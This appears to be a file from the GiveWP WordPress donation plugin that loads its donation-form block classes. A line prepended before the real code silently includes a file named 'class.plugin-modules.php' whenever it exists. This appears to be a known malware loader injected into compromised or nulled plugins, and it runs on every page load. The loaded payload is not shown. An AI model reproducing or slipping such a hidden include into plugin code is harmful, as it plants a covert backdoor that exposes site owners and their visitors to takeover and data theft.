<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
// Exit if access directly.
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
* Blocks
*/
require_once GIVE_PLUGIN_DIR . 'blocks/donation-form/class-give-donation-form-block.php';
require_once GIVE_PLUGIN_DIR . 'blocks/donation-form-grid/class-give-donation-form-grid-block.php';
